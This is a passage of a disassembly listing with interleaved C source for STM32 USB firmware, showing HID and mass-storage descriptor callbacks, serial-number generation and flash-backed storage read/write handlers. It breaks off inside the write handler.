 800c644:	f7f4 fc3c 	bl	8000ec0 <Error_Handler>
  }
  if (USBD_Start(&hUsbDeviceFS_MSC) != USBD_OK)
 800c648:	4805      	ldr	r0, [pc, #20]	; (800c660 <MX_USB_DEVICE_Init_MSC+0x54>)
 800c64a:	f7fe fd84 	bl	800b156 <USBD_Start>
 800c64e:	4603      	mov	r3, r0
 800c650:	2b00      	cmp	r3, #0
 800c652:	d001      	beq.n	800c658 <MX_USB_DEVICE_Init_MSC+0x4c>
  {
    Error_Handler();
 800c654:	f7f4 fc34 	bl	8000ec0 <Error_Handler>
  }
  /* USER CODE BEGIN USB_DEVICE_Init_PostTreatment */

  /* USER CODE END USB_DEVICE_Init_PostTreatment */
}
 800c658:	bf00      	nop
 800c65a:	bd80      	pop	{r7, pc}
 800c65c:	200001ac 	.word	0x200001ac
 800c660:	2000069c 	.word	0x2000069c
 800c664:	200000a8 	.word	0x200000a8
 800c668:	20000220 	.word	0x20000220

0800c66c <CUSTOM_HID_Init_FS>:
/**
  * @brief  Initializes the CUSTOM HID media low layer
  * @retval USBD_OK if all operations are OK else USBD_FAIL
  */
static int8_t CUSTOM_HID_Init_FS(void)
{
 800c66c:	b480      	push	{r7}
 800c66e:	af00      	add	r7, sp, #0
  /* USER CODE BEGIN 4 */
  return (USBD_OK);
 800c670:	2300      	movs	r3, #0
  /* USER CODE END 4 */
}
 800c672:	4618      	mov	r0, r3
 800c674:	46bd      	mov	sp, r7
 800c676:	f85d 7b04 	ldr.w	r7, [sp], #4
 800c67a:	4770      	bx	lr

0800c67c <CUSTOM_HID_DeInit_FS>:
/**
  * @brief  DeInitializes the CUSTOM HID media low layer
  * @retval USBD_OK if all operations are OK else USBD_FAIL
  */
static int8_t CUSTOM_HID_DeInit_FS(void)
{
 800c67c:	b480      	push	{r7}
 800c67e:	af00      	add	r7, sp, #0
  /* USER CODE BEGIN 5 */
  return (USBD_OK);
 800c680:	2300      	movs	r3, #0
  /* USER CODE END 5 */
}
 800c682:	4618      	mov	r0, r3
 800c684:	46bd      	mov	sp, r7
 800c686:	f85d 7b04 	ldr.w	r7, [sp], #4
 800c68a:	4770      	bx	lr

0800c68c <CUSTOM_HID_OutEvent_FS>:
  * @param  event_idx: Event index
  * @param  state: Event state
  * @retval USBD_OK if all operations are OK else USBD_FAIL
  */
static int8_t CUSTOM_HID_OutEvent_FS(uint8_t event_idx, uint8_t state)
{
 800c68c:	b580      	push	{r7, lr}
 800c68e:	b082      	sub	sp, #8
 800c690:	af00      	add	r7, sp, #0
 800c692:	4603      	mov	r3, r0
 800c694:	460a      	mov	r2, r1
 800c696:	71fb      	strb	r3, [r7, #7]
 800c698:	4613      	mov	r3, r2
 800c69a:	71bb      	strb	r3, [r7, #6]
  /* USER CODE BEGIN 6 */
  UNUSED(event_idx);
  UNUSED(state);

  /* Start next USB packet transfer once data processing is completed */
  USBD_CUSTOM_HID_ReceivePacket(&hUsbDeviceFS);
 800c69c:	4803      	ldr	r0, [pc, #12]	; (800c6ac <CUSTOM_HID_OutEvent_FS+0x20>)
 800c69e:	f7fc fbd1 	bl	8008e44 <USBD_CUSTOM_HID_ReceivePacket>

  return (USBD_OK);
 800c6a2:	2300      	movs	r3, #0
  /* USER CODE END 6 */
}
 800c6a4:	4618      	mov	r0, r3
 800c6a6:	3708      	adds	r7, #8
 800c6a8:	46bd      	mov	sp, r7
 800c6aa:	bd80      	pop	{r7, pc}
 800c6ac:	200003c0 	.word	0x200003c0

0800c6b0 <USBD_FS_DeviceDescriptor>:
  * @param  speed : Current device speed
  * @param  length : Pointer to data length variable
  * @retval Pointer to descriptor buffer
  */
uint8_t * USBD_FS_DeviceDescriptor(USBD_SpeedTypeDef speed, uint16_t *length)
{
 800c6b0:	b480      	push	{r7}
 800c6b2:	b083      	sub	sp, #12
 800c6b4:	af00      	add	r7, sp, #0
 800c6b6:	4603      	mov	r3, r0
 800c6b8:	6039      	str	r1, [r7, #0]
 800c6ba:	71fb      	strb	r3, [r7, #7]
  UNUSED(speed);
  *length = sizeof(USBD_FS_DeviceDesc);
 800c6bc:	683b      	ldr	r3, [r7, #0]
 800c6be:	2212      	movs	r2, #18
 800c6c0:	801a      	strh	r2, [r3, #0]
  if(isMSC == 1)
 800c6c2:	4b06      	ldr	r3, [pc, #24]	; (800c6dc <USBD_FS_DeviceDescriptor+0x2c>)
 800c6c4:	681b      	ldr	r3, [r3, #0]
 800c6c6:	2b01      	cmp	r3, #1
 800c6c8:	d101      	bne.n	800c6ce <USBD_FS_DeviceDescriptor+0x1e>
	  return USBD_FS_DeviceDesc;
 800c6ca:	4b05      	ldr	r3, [pc, #20]	; (800c6e0 <USBD_FS_DeviceDescriptor+0x30>)
 800c6cc:	e000      	b.n	800c6d0 <USBD_FS_DeviceDescriptor+0x20>
  else
	  return USBD_FS_DeviceDesc_HID;
 800c6ce:	4b05      	ldr	r3, [pc, #20]	; (800c6e4 <USBD_FS_DeviceDescriptor+0x34>)
}
 800c6d0:	4618      	mov	r0, r3
 800c6d2:	370c      	adds	r7, #12
 800c6d4:	46bd      	mov	sp, r7
 800c6d6:	f85d 7b04 	ldr.w	r7, [sp], #4
 800c6da:	4770      	bx	lr
 800c6dc:	20000978 	.word	0x20000978
 800c6e0:	200001cc 	.word	0x200001cc
 800c6e4:	200001e0 	.word	0x200001e0

0800c6e8 <USBD_FS_LangIDStrDescriptor>:
  * @param  speed : Current device speed
  * @param  length : Pointer to data length variable
  * @retval Pointer to descriptor buffer
  */
uint8_t * USBD_FS_LangIDStrDescriptor(USBD_SpeedTypeDef speed, uint16_t *length)
{
 800c6e8:	b480      	push	{r7}
 800c6ea:	b083      	sub	sp, #12
 800c6ec:	af00      	add	r7, sp, #0
 800c6ee:	4603      	mov	r3, r0
 800c6f0:	6039      	str	r1, [r7, #0]
 800c6f2:	71fb      	strb	r3, [r7, #7]
  UNUSED(speed);
  *length = sizeof(USBD_LangIDDesc);
 800c6f4:	683b      	ldr	r3, [r7, #0]
 800c6f6:	2204      	movs	r2, #4
 800c6f8:	801a      	strh	r2, [r3, #0]
  return USBD_LangIDDesc;
 800c6fa:	4b03      	ldr	r3, [pc, #12]	; (800c708 <USBD_FS_LangIDStrDescriptor+0x20>)
}
 800c6fc:	4618      	mov	r0, r3
 800c6fe:	370c      	adds	r7, #12
 800c700:	46bd      	mov	sp, r7
 800c702:	f85d 7b04 	ldr.w	r7, [sp], #4
 800c706:	4770      	bx	lr
 800c708:	20000200 	.word	0x20000200

0800c70c <USBD_FS_ProductStrDescriptor>:
  * @param  speed : Current device speed
  * @param  length : Pointer to data length variable
  * @retval Pointer to descriptor buffer
  */
uint8_t * USBD_FS_ProductStrDescriptor(USBD_SpeedTypeDef speed, uint16_t *length)
{
 800c70c:	b580      	push	{r7, lr}
 800c70e:	b082      	sub	sp, #8
 800c710:	af00      	add	r7, sp, #0
 800c712:	4603      	mov	r3, r0
 800c714:	6039      	str	r1, [r7, #0]
 800c716:	71fb      	strb	r3, [r7, #7]
  if(speed == 0)
 800c718:	79fb      	ldrb	r3, [r7, #7]
 800c71a:	2b00      	cmp	r3, #0
 800c71c:	d105      	bne.n	800c72a <USBD_FS_ProductStrDescriptor+0x1e>
  {
    USBD_GetString((uint8_t *)USBD_PRODUCT_STRING_FS, USBD_StrDesc, length);
 800c71e:	683a      	ldr	r2, [r7, #0]
 800c720:	4907      	ldr	r1, [pc, #28]	; (800c740 <USBD_FS_ProductStrDescriptor+0x34>)
 800c722:	4808      	ldr	r0, [pc, #32]	; (800c744 <USBD_FS_ProductStrDescriptor+0x38>)
 800c724:	f7ff fe62 	bl	800c3ec <USBD_GetString>
 800c728:	e004      	b.n	800c734 <USBD_FS_ProductStrDescriptor+0x28>
  }
  else
  {
    USBD_GetString((uint8_t *)USBD_PRODUCT_STRING_FS, USBD_StrDesc, length);
 800c72a:	683a      	ldr	r2, [r7, #0]
 800c72c:	4904      	ldr	r1, [pc, #16]	; (800c740 <USBD_FS_ProductStrDescriptor+0x34>)
 800c72e:	4805      	ldr	r0, [pc, #20]	; (800c744 <USBD_FS_ProductStrDescriptor+0x38>)
 800c730:	f7ff fe5c 	bl	800c3ec <USBD_GetString>
  }
  return USBD_StrDesc;
 800c734:	4b02      	ldr	r3, [pc, #8]	; (800c740 <USBD_FS_ProductStrDescriptor+0x34>)
}
 800c736:	4618      	mov	r0, r3
 800c738:	3708      	adds	r7, #8
 800c73a:	46bd      	mov	sp, r7
 800c73c:	bd80      	pop	{r7, pc}
 800c73e:	bf00      	nop
 800c740:	2000097c 	.word	0x2000097c
 800c744:	0800d440 	.word	0x0800d440

0800c748 <USBD_FS_ManufacturerStrDescriptor>:
  * @param  speed : Current device speed
  * @param  length : Pointer to data length variable
  * @retval Pointer to descriptor buffer
  */
uint8_t * USBD_FS_ManufacturerStrDescriptor(USBD_SpeedTypeDef speed, uint16_t *length)
{
 800c748:	b580      	push	{r7, lr}
 800c74a:	b082      	sub	sp, #8
 800c74c:	af00      	add	r7, sp, #0
 800c74e:	4603      	mov	r3, r0
 800c750:	6039      	str	r1, [r7, #0]
 800c752:	71fb      	strb	r3, [r7, #7]
  UNUSED(speed);
  USBD_GetString((uint8_t *)USBD_MANUFACTURER_STRING, USBD_StrDesc, length);
 800c754:	683a      	ldr	r2, [r7, #0]
 800c756:	4904      	ldr	r1, [pc, #16]	; (800c768 <USBD_FS_ManufacturerStrDescriptor+0x20>)
 800c758:	4804      	ldr	r0, [pc, #16]	; (800c76c <USBD_FS_ManufacturerStrDescriptor+0x24>)
 800c75a:	f7ff fe47 	bl	800c3ec <USBD_GetString>
  return USBD_StrDesc;
 800c75e:	4b02      	ldr	r3, [pc, #8]	; (800c768 <USBD_FS_ManufacturerStrDescriptor+0x20>)
}
 800c760:	4618      	mov	r0, r3
 800c762:	3708      	adds	r7, #8
 800c764:	46bd      	mov	sp, r7
 800c766:	bd80      	pop	{r7, pc}
 800c768:	2000097c 	.word	0x2000097c
 800c76c:	0800d454 	.word	0x0800d454

0800c770 <USBD_FS_SerialStrDescriptor>:
  * @param  speed : Current device speed
  * @param  length : Pointer to data length variable
  * @retval Pointer to descriptor buffer
  */
uint8_t * USBD_FS_SerialStrDescriptor(USBD_SpeedTypeDef speed, uint16_t *length)
{
 800c770:	b580      	push	{r7, lr}
 800c772:	b082      	sub	sp, #8
 800c774:	af00      	add	r7, sp, #0
 800c776:	4603      	mov	r3, r0
 800c778:	6039      	str	r1, [r7, #0]
 800c77a:	71fb      	strb	r3, [r7, #7]
  UNUSED(speed);
  *length = USB_SIZ_STRING_SERIAL;
 800c77c:	683b      	ldr	r3, [r7, #0]
 800c77e:	221a      	movs	r2, #26
 800c780:	801a      	strh	r2, [r3, #0]

  /* Update the serial number string descriptor with the data from the unique
   * ID */
  Get_SerialNum();
 800c782:	f000 f855 	bl	800c830 <Get_SerialNum>
  /* USER CODE BEGIN USBD_FS_SerialStrDescriptor */

  /* USER CODE END USBD_FS_SerialStrDescriptor */
  return (uint8_t *) USBD_StringSerial;
 800c786:	4b02      	ldr	r3, [pc, #8]	; (800c790 <USBD_FS_SerialStrDescriptor+0x20>)
}
 800c788:	4618      	mov	r0, r3
 800c78a:	3708      	adds	r7, #8
 800c78c:	46bd      	mov	sp, r7
 800c78e:	bd80      	pop	{r7, pc}
 800c790:	20000204 	.word	0x20000204

0800c794 <USBD_FS_ConfigStrDescriptor>:
  * @param  speed : Current device speed
  * @param  length : Pointer to data length variable
  * @retval Pointer to descriptor buffer
  */
uint8_t * USBD_FS_ConfigStrDescriptor(USBD_SpeedTypeDef speed, uint16_t *length)
{
 800c794:	b580      	push	{r7, lr}
 800c796:	b082      	sub	sp, #8
 800c798:	af00      	add	r7, sp, #0
 800c79a:	4603      	mov	r3, r0
 800c79c:	6039      	str	r1, [r7, #0]
 800c79e:	71fb      	strb	r3, [r7, #7]
  if(speed == USBD_SPEED_HIGH)
 800c7a0:	79fb      	ldrb	r3, [r7, #7]
 800c7a2:	2b00      	cmp	r3, #0
 800c7a4:	d105      	bne.n	800c7b2 <USBD_FS_ConfigStrDescriptor+0x1e>
  {
    USBD_GetString((uint8_t *)USBD_CONFIGURATION_STRING_FS, USBD_StrDesc, length);
 800c7a6:	683a      	ldr	r2, [r7, #0]
 800c7a8:	4907      	ldr	r1, [pc, #28]	; (800c7c8 <USBD_FS_ConfigStrDescriptor+0x34>)
 800c7aa:	4808      	ldr	r0, [pc, #32]	; (800c7cc <USBD_FS_ConfigStrDescriptor+0x38>)
 800c7ac:	f7ff fe1e 	bl	800c3ec <USBD_GetString>
 800c7b0:	e004      	b.n	800c7bc <USBD_FS_ConfigStrDescriptor+0x28>
  }
  else
  {
    USBD_GetString((uint8_t *)USBD_CONFIGURATION_STRING_FS, USBD_StrDesc, length);
 800c7b2:	683a      	ldr	r2, [r7, #0]
 800c7b4:	4904      	ldr	r1, [pc, #16]	; (800c7c8 <USBD_FS_ConfigStrDescriptor+0x34>)
 800c7b6:	4805      	ldr	r0, [pc, #20]	; (800c7cc <USBD_FS_ConfigStrDescriptor+0x38>)
 800c7b8:	f7ff fe18 	bl	800c3ec <USBD_GetString>
  }
  return USBD_StrDesc;
 800c7bc:	4b02      	ldr	r3, [pc, #8]	; (800c7c8 <USBD_FS_ConfigStrDescriptor+0x34>)
}
 800c7be:	4618      	mov	r0, r3
 800c7c0:	3708      	adds	r7, #8
 800c7c2:	46bd      	mov	sp, r7
 800c7c4:	bd80      	pop	{r7, pc}
 800c7c6:	bf00      	nop
 800c7c8:	2000097c 	.word	0x2000097c
 800c7cc:	0800d458 	.word	0x0800d458

0800c7d0 <USBD_FS_InterfaceStrDescriptor>:
  * @param  speed : Current device speed
  * @param  length : Pointer to data length variable
  * @retval Pointer to descriptor buffer
  */
uint8_t * USBD_FS_InterfaceStrDescriptor(USBD_SpeedTypeDef speed, uint16_t *length)
{
 800c7d0:	b580      	push	{r7, lr}
 800c7d2:	b082      	sub	sp, #8
 800c7d4:	af00      	add	r7, sp, #0
 800c7d6:	4603      	mov	r3, r0
 800c7d8:	6039      	str	r1, [r7, #0]
 800c7da:	71fb      	strb	r3, [r7, #7]
  if(speed == 0)
 800c7dc:	79fb      	ldrb	r3, [r7, #7]
 800c7de:	2b00      	cmp	r3, #0
 800c7e0:	d105      	bne.n	800c7ee <USBD_FS_InterfaceStrDescriptor+0x1e>
  {
    USBD_GetString((uint8_t *)USBD_INTERFACE_STRING_FS, USBD_StrDesc, length);
 800c7e2:	683a      	ldr	r2, [r7, #0]
 800c7e4:	4907      	ldr	r1, [pc, #28]	; (800c804 <USBD_FS_InterfaceStrDescriptor+0x34>)
 800c7e6:	4808      	ldr	r0, [pc, #32]	; (800c808 <USBD_FS_InterfaceStrDescriptor+0x38>)
 800c7e8:	f7ff fe00 	bl	800c3ec <USBD_GetString>
 800c7ec:	e004      	b.n	800c7f8 <USBD_FS_InterfaceStrDescriptor+0x28>
  }
  else
  {
    USBD_GetString((uint8_t *)USBD_INTERFACE_STRING_FS, USBD_StrDesc, length);
 800c7ee:	683a      	ldr	r2, [r7, #0]
 800c7f0:	4904      	ldr	r1, [pc, #16]	; (800c804 <USBD_FS_InterfaceStrDescriptor+0x34>)
 800c7f2:	4805      	ldr	r0, [pc, #20]	; (800c808 <USBD_FS_InterfaceStrDescriptor+0x38>)
 800c7f4:	f7ff fdfa 	bl	800c3ec <USBD_GetString>
  }
  return USBD_StrDesc;
 800c7f8:	4b02      	ldr	r3, [pc, #8]	; (800c804 <USBD_FS_InterfaceStrDescriptor+0x34>)
}
 800c7fa:	4618      	mov	r0, r3
 800c7fc:	3708      	adds	r7, #8
 800c7fe:	46bd      	mov	sp, r7
 800c800:	bd80      	pop	{r7, pc}
 800c802:	bf00      	nop
 800c804:	2000097c 	.word	0x2000097c
 800c808:	0800d464 	.word	0x0800d464

0800c80c <USBD_FS_USR_BOSDescriptor>:
  * @param  speed : Current device speed
  * @param  length : Pointer to data length variable
  * @retval Pointer to descriptor buffer
  */
uint8_t * USBD_FS_USR_BOSDescriptor(USBD_SpeedTypeDef speed, uint16_t *length)
{
 800c80c:	b480      	push	{r7}
 800c80e:	b083      	sub	sp, #12
 800c810:	af00      	add	r7, sp, #0
 800c812:	4603      	mov	r3, r0
 800c814:	6039      	str	r1, [r7, #0]
 800c816:	71fb      	strb	r3, [r7, #7]
  UNUSED(speed);
  *length = sizeof(USBD_FS_BOSDesc);
 800c818:	683b      	ldr	r3, [r7, #0]
 800c81a:	220c      	movs	r2, #12
 800c81c:	801a      	strh	r2, [r3, #0]
  return (uint8_t*)USBD_FS_BOSDesc;
 800c81e:	4b03      	ldr	r3, [pc, #12]	; (800c82c <USBD_FS_USR_BOSDescriptor+0x20>)
}
 800c820:	4618      	mov	r0, r3
 800c822:	370c      	adds	r7, #12
 800c824:	46bd      	mov	sp, r7
 800c826:	f85d 7b04 	ldr.w	r7, [sp], #4
 800c82a:	4770      	bx	lr
 800c82c:	200001f4 	.word	0x200001f4

0800c830 <Get_SerialNum>:
  * @brief  Create the serial number string descriptor
  * @param  None
  * @retval None
  */
static void Get_SerialNum(void)
{
 800c830:	b580      	push	{r7, lr}
 800c832:	b084      	sub	sp, #16
 800c834:	af00      	add	r7, sp, #0
  uint32_t deviceserial0;
  uint32_t deviceserial1;
  uint32_t deviceserial2;

  deviceserial0 = *(uint32_t *) DEVICE_ID1;
 800c836:	4b0f      	ldr	r3, [pc, #60]	; (800c874 <Get_SerialNum+0x44>)
 800c838:	681b      	ldr	r3, [r3, #0]
 800c83a:	60fb      	str	r3, [r7, #12]
  deviceserial1 = *(uint32_t *) DEVICE_ID2;
 800c83c:	4b0e      	ldr	r3, [pc, #56]	; (800c878 <Get_SerialNum+0x48>)
 800c83e:	681b      	ldr	r3, [r3, #0]
 800c840:	60bb      	str	r3, [r7, #8]
  deviceserial2 = *(uint32_t *) DEVICE_ID3;
 800c842:	4b0e      	ldr	r3, [pc, #56]	; (800c87c <Get_SerialNum+0x4c>)
 800c844:	681b      	ldr	r3, [r3, #0]
 800c846:	607b      	str	r3, [r7, #4]

  deviceserial0 += deviceserial2;
 800c848:	68fa      	ldr	r2, [r7, #12]
 800c84a:	687b      	ldr	r3, [r7, #4]
 800c84c:	4413      	add	r3, r2
 800c84e:	60fb      	str	r3, [r7, #12]

  if (deviceserial0 != 0)
 800c850:	68fb      	ldr	r3, [r7, #12]
 800c852:	2b00      	cmp	r3, #0
 800c854:	d009      	beq.n	800c86a <Get_SerialNum+0x3a>
  {
    IntToUnicode(deviceserial0, &USBD_StringSerial[2], 8);
 800c856:	2208      	movs	r2, #8
 800c858:	4909      	ldr	r1, [pc, #36]	; (800c880 <Get_SerialNum+0x50>)
 800c85a:	68f8      	ldr	r0, [r7, #12]
 800c85c:	f000 f814 	bl	800c888 <IntToUnicode>
    IntToUnicode(deviceserial1, &USBD_StringSerial[18], 4);
 800c860:	2204      	movs	r2, #4
 800c862:	4908      	ldr	r1, [pc, #32]	; (800c884 <Get_SerialNum+0x54>)
 800c864:	68b8      	ldr	r0, [r7, #8]
 800c866:	f000 f80f 	bl	800c888 <IntToUnicode>
  }
}
 800c86a:	bf00      	nop
 800c86c:	3710      	adds	r7, #16
 800c86e:	46bd      	mov	sp, r7
 800c870:	bd80      	pop	{r7, pc}
 800c872:	bf00      	nop
 800c874:	1fff7590 	.word	0x1fff7590
 800c878:	1fff7594 	.word	0x1fff7594
 800c87c:	1fff7598 	.word	0x1fff7598
 800c880:	20000206 	.word	0x20000206
 800c884:	20000216 	.word	0x20000216

0800c888 <IntToUnicode>:
  * @param  pbuf: pointer to the buffer
  * @param  len: buffer length
  * @retval None
  */
static void IntToUnicode(uint32_t value, uint8_t * pbuf, uint8_t len)
{
 800c888:	b480      	push	{r7}
 800c88a:	b087      	sub	sp, #28
 800c88c:	af00      	add	r7, sp, #0
 800c88e:	60f8      	str	r0, [r7, #12]
 800c890:	60b9      	str	r1, [r7, #8]
 800c892:	4613      	mov	r3, r2
 800c894:	71fb      	strb	r3, [r7, #7]
  uint8_t idx = 0;
 800c896:	2300      	movs	r3, #0
 800c898:	75fb      	strb	r3, [r7, #23]

  for (idx = 0; idx < len; idx++)
 800c89a:	2300      	movs	r3, #0
 800c89c:	75fb      	strb	r3, [r7, #23]
 800c89e:	e027      	b.n	800c8f0 <IntToUnicode+0x68>
  {
    if (((value >> 28)) < 0xA)
 800c8a0:	68fb      	ldr	r3, [r7, #12]
 800c8a2:	0f1b      	lsrs	r3, r3, #28
 800c8a4:	2b09      	cmp	r3, #9
 800c8a6:	d80b      	bhi.n	800c8c0 <IntToUnicode+0x38>
    {
      pbuf[2 * idx] = (value >> 28) + '0';
 800c8a8:	68fb      	ldr	r3, [r7, #12]
 800c8aa:	0f1b      	lsrs	r3, r3, #28
 800c8ac:	b2da      	uxtb	r2, r3
 800c8ae:	7dfb      	ldrb	r3, [r7, #23]
 800c8b0:	005b      	lsls	r3, r3, #1
 800c8b2:	4619      	mov	r1, r3
 800c8b4:	68bb      	ldr	r3, [r7, #8]
 800c8b6:	440b      	add	r3, r1
 800c8b8:	3230      	adds	r2, #48	; 0x30
 800c8ba:	b2d2      	uxtb	r2, r2
 800c8bc:	701a      	strb	r2, [r3, #0]
 800c8be:	e00a      	b.n	800c8d6 <IntToUnicode+0x4e>
    }
    else
    {
      pbuf[2 * idx] = (value >> 28) + 'A' - 10;
 800c8c0:	68fb      	ldr	r3, [r7, #12]
 800c8c2:	0f1b      	lsrs	r3, r3, #28
 800c8c4:	b2da      	uxtb	r2, r3
 800c8c6:	7dfb      	ldrb	r3, [r7, #23]
 800c8c8:	005b      	lsls	r3, r3, #1
 800c8ca:	4619      	mov	r1, r3
 800c8cc:	68bb      	ldr	r3, [r7, #8]
 800c8ce:	440b      	add	r3, r1
 800c8d0:	3237      	adds	r2, #55	; 0x37
 800c8d2:	b2d2      	uxtb	r2, r2
 800c8d4:	701a      	strb	r2, [r3, #0]
    }

    value = value << 4;
 800c8d6:	68fb      	ldr	r3, [r7, #12]
 800c8d8:	011b      	lsls	r3, r3, #4
 800c8da:	60fb      	str	r3, [r7, #12]

    pbuf[2 * idx + 1] = 0;
 800c8dc:	7dfb      	ldrb	r3, [r7, #23]
 800c8de:	005b      	lsls	r3, r3, #1
 800c8e0:	3301      	adds	r3, #1
 800c8e2:	68ba      	ldr	r2, [r7, #8]
 800c8e4:	4413      	add	r3, r2
 800c8e6:	2200      	movs	r2, #0
 800c8e8:	701a      	strb	r2, [r3, #0]
  for (idx = 0; idx < len; idx++)
 800c8ea:	7dfb      	ldrb	r3, [r7, #23]
 800c8ec:	3301      	adds	r3, #1
 800c8ee:	75fb      	strb	r3, [r7, #23]
 800c8f0:	7dfa      	ldrb	r2, [r7, #23]
 800c8f2:	79fb      	ldrb	r3, [r7, #7]
 800c8f4:	429a      	cmp	r2, r3
 800c8f6:	d3d3      	bcc.n	800c8a0 <IntToUnicode+0x18>
  }
}
 800c8f8:	bf00      	nop
 800c8fa:	bf00      	nop
 800c8fc:	371c      	adds	r7, #28
 800c8fe:	46bd      	mov	sp, r7
 800c900:	f85d 7b04 	ldr.w	r7, [sp], #4
 800c904:	4770      	bx	lr

0800c906 <STORAGE_Init_FS>:
  * @brief  Initializes over USB FS IP
  * @param  lun:
  * @retval USBD_OK if all operations are OK else USBD_FAIL
  */
int8_t STORAGE_Init_FS(uint8_t lun)
{
 800c906:	b480      	push	{r7}
 800c908:	b083      	sub	sp, #12
 800c90a:	af00      	add	r7, sp, #0
 800c90c:	4603      	mov	r3, r0
 800c90e:	71fb      	strb	r3, [r7, #7]
  /* USER CODE BEGIN 2 */
  return (USBD_OK);
 800c910:	2300      	movs	r3, #0
  /* USER CODE END 2 */
}
 800c912:	4618      	mov	r0, r3
 800c914:	370c      	adds	r7, #12
 800c916:	46bd      	mov	sp, r7
 800c918:	f85d 7b04 	ldr.w	r7, [sp], #4
 800c91c:	4770      	bx	lr

0800c91e <STORAGE_GetCapacity_FS>:
  * @param  block_num: .
  * @param  block_size: .
  * @retval USBD_OK if all operations are OK else USBD_FAIL
  */
int8_t STORAGE_GetCapacity_FS(uint8_t lun, uint32_t *block_num, uint16_t *block_size)
{
 800c91e:	b480      	push	{r7}
 800c920:	b085      	sub	sp, #20
 800c922:	af00      	add	r7, sp, #0
 800c924:	4603      	mov	r3, r0
 800c926:	60b9      	str	r1, [r7, #8]
 800c928:	607a      	str	r2, [r7, #4]
 800c92a:	73fb      	strb	r3, [r7, #15]
  /* USER CODE BEGIN 3 */
	*block_num  = FLASH_PAGE_NBR;
 800c92c:	68bb      	ldr	r3, [r7, #8]
 800c92e:	2240      	movs	r2, #64	; 0x40
 800c930:	601a      	str	r2, [r3, #0]
	*block_size = FLASH_PAGE_SIZE;
 800c932:	687b      	ldr	r3, [r7, #4]
 800c934:	f44f 6200 	mov.w	r2, #2048	; 0x800
 800c938:	801a      	strh	r2, [r3, #0]
  return (USBD_OK);
 800c93a:	2300      	movs	r3, #0
  /* USER CODE END 3 */
}
 800c93c:	4618      	mov	r0, r3
 800c93e:	3714      	adds	r7, #20
 800c940:	46bd      	mov	sp, r7
 800c942:	f85d 7b04 	ldr.w	r7, [sp], #4
 800c946:	4770      	bx	lr

0800c948 <STORAGE_IsReady_FS>:
  * @brief  .
  * @param  lun: .
  * @retval USBD_OK if all operations are OK else USBD_FAIL
  */
int8_t STORAGE_IsReady_FS(uint8_t lun)
{
 800c948:	b480      	push	{r7}
 800c94a:	b083      	sub	sp, #12
 800c94c:	af00      	add	r7, sp, #0
 800c94e:	4603      	mov	r3, r0
 800c950:	71fb      	strb	r3, [r7, #7]
  /* USER CODE BEGIN 4 */
  return (USBD_OK);
 800c952:	2300      	movs	r3, #0
  /* USER CODE END 4 */
}
 800c954:	4618      	mov	r0, r3
 800c956:	370c      	adds	r7, #12
 800c958:	46bd      	mov	sp, r7
 800c95a:	f85d 7b04 	ldr.w	r7, [sp], #4
 800c95e:	4770      	bx	lr

0800c960 <STORAGE_IsWriteProtected_FS>:
  * @brief  .
  * @param  lun: .
  * @retval USBD_OK if all operations are OK else USBD_FAIL
  */
int8_t STORAGE_IsWriteProtected_FS(uint8_t lun)
{
 800c960:	b480      	push	{r7}
 800c962:	b083      	sub	sp, #12
 800c964:	af00      	add	r7, sp, #0
 800c966:	4603      	mov	r3, r0
 800c968:	71fb      	strb	r3, [r7, #7]
  /* USER CODE BEGIN 5 */
  return (USBD_OK);
 800c96a:	2300      	movs	r3, #0
  /* USER CODE END 5 */
}
 800c96c:	4618      	mov	r0, r3
 800c96e:	370c      	adds	r7, #12
 800c970:	46bd      	mov	sp, r7
 800c972:	f85d 7b04 	ldr.w	r7, [sp], #4
 800c976:	4770      	bx	lr

0800c978 <STORAGE_Read_FS>:
  * @brief  .
  * @param  lun: .
  * @retval USBD_OK if all operations are OK else USBD_FAIL
  */
int8_t STORAGE_Read_FS(uint8_t lun, uint8_t *buf, uint32_t blk_addr, uint16_t blk_len)
{
 800c978:	b580      	push	{r7, lr}
 800c97a:	b084      	sub	sp, #16
 800c97c:	af00      	add	r7, sp, #0
 800c97e:	60b9      	str	r1, [r7, #8]
 800c980:	607a      	str	r2, [r7, #4]
 800c982:	461a      	mov	r2, r3
 800c984:	4603      	mov	r3, r0
 800c986:	73fb      	strb	r3, [r7, #15]
 800c988:	4613      	mov	r3, r2
 800c98a:	81bb      	strh	r3, [r7, #12]
  /* USER CODE BEGIN 6 */
	if(lun == 0){
 800c98c:	7bfb      	ldrb	r3, [r7, #15]
 800c98e:	2b00      	cmp	r3, #0
 800c990:	d10d      	bne.n	800c9ae <STORAGE_Read_FS+0x36>
		memcpy(buf, (uint8_t*)(FLASH_START_ADDR + blk_addr * FLASH_PAGE_SIZE), blk_len * FLASH_PAGE_SIZE);
 800c992:	687b      	ldr	r3, [r7, #4]
 800c994:	f503 3380 	add.w	r3, r3, #65536	; 0x10000
 800c998:	3340      	adds	r3, #64	; 0x40
 800c99a:	02db      	lsls	r3, r3, #11
 800c99c:	4619      	mov	r1, r3
 800c99e:	89bb      	ldrh	r3, [r7, #12]
 800c9a0:	02db      	lsls	r3, r3, #11
 800c9a2:	461a      	mov	r2, r3
 800c9a4:	68b8      	ldr	r0, [r7, #8]
 800c9a6:	f000 fc65 	bl	800d274 <memcpy>
		return (USBD_OK);
 800c9aa:	2300      	movs	r3, #0
 800c9ac:	e000      	b.n	800c9b0 <STORAGE_Read_FS+0x38>
	}
  return (USBD_FAIL);
 800c9ae:	2303      	movs	r3, #3
  /* USER CODE END 6 */
}
 800c9b0:	4618      	mov	r0, r3
 800c9b2:	3710      	adds	r7, #16
 800c9b4:	46bd      	mov	sp, r7
 800c9b6:	bd80      	pop	{r7, pc}

0800c9b8 <STORAGE_Write_FS>:
  * @brief  .
  * @param  lun: .
  * @retval USBD_OK if all operations are OK else USBD_FAIL
  */
int8_t STORAGE_Write_FS(uint8_t lun, uint8_t *buf, uint32_t blk_addr, uint16_t blk_len)
{
 800c9b8:	b580      	push	{r7, lr}
 800c9ba:	b08a      	sub	sp, #40	; 0x28
 800c9bc:	af00      	add	r7, sp, #0
 800c9be:	60b9      	str	r1, [r7, #8]
 800c9c0:	607a      	str	r2, [r7, #4]
 800c9c2:	461a      	mov	r2, r3
 800c9c4:	4603      	mov	r3, r0
 800c9c6:	73fb      	strb	r3, [r7, #15]
 800c9c8:	4613      	mov	r3, r2
 800c9ca:	81bb      	strh	r3, [r7, #12]
  /* USER CODE BEGIN 7 */
	if(lun == 0){
 800c9cc:	7bfb      	ldrb	r3, [r7, #15]
 800c9ce:	2b00      	cmp	r3, #0
 800c9d0:	d136      	bne.n	800ca40 <STORAGE_Write_FS+0x88>
		uint16_t i;
		HAL_FLASH_Unlock();
